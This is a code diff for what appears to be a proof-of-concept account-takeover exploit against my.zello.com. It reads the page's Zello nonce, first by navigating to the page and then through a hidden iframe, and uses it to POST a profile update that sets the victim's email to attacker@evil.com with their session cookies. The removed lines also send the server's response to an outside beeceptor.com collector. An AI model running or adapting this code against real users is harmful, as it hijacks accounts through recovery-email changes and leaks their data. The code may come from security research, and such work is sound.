@@ -9,25 +9,28 @@
    credentials: 'include'
 });
 */
-// Navigate to home page to get access to Zello object
-window.location.href = 'https://my.zello.com/user/home';
+const iframe = document.createElement('iframe');
+iframe.src = 'https://my.zello.com/user/home';
+iframe.style.display = 'none';
+document.body.appendChild(iframe);
 
-// Then on that page, execute:
-const nonce = Zello['nonce'];
-fetch('https://my.zello.com/user/update_profile', {
-  method: 'POST',
-  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-  body: new URLSearchParams({
-    email: 'attacker@evil.com',
-    phone: '',
-    safe_info_pass_update: 0,
-    nonce: nonce
-  }),
-  credentials: 'include'
-})
-.then(r => r.json())
-.then(d => fetch('https://ywhftw.free.beeceptor.com/', {
-  method: 'POST', //optional 
-  body: JSON.stringify(d),
-  mode: 'no-cors'
-}));
+iframe.onload = function() {
+  try {
+    // Access the Zello object from the iframe's window
+    const nonce = iframe.contentWindow.Zello['nonce'];
+    
+    fetch('https://my.zello.com/user/update_profile', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+      body: new URLSearchParams({
+        email: 'attacker@evil.com',
+        phone: '',
+        safe_info_pass_update: 0,
+        nonce: nonce
+      }),
+      credentials: 'include'
+    });
+  } catch(e) {
+    console.error('Cannot access iframe:', e);
+  }
+};
